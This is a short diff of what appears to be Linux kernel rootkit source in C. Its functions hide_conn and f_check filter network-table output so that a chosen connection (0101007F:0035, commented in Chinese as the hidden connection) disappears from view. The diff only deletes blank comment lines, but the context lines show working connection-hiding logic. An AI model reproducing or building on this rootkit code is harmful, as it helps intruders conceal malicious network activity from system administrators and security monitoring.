@@ -14,7 +14,6 @@ char *hide_connection = "0101007F:0035";//隐藏的连接，地址：端口号
 char *next_connection = "0100007F:0277";
 
 int hide_conn(void *arg, ssize_t size){
-//
 	char *p[5];
 	char *buf, *p1, *p2;
 	int i, newret;
@@ -42,7 +41,6 @@ int hide_conn(void *arg, ssize_t size){
 
 	return newret;
 
-//
 }
 
 
@@ -93,7 +91,6 @@ int f_check(void *arg, ssize_t size) {
 		kfree(buf);
 		return(1);
 	}
-//
 	if ((strstr(buf, "local_address") !=NULL) && (strstr(buf, "0101007F")!= NULL)) {		
 		kfree(buf);
 		return(2);
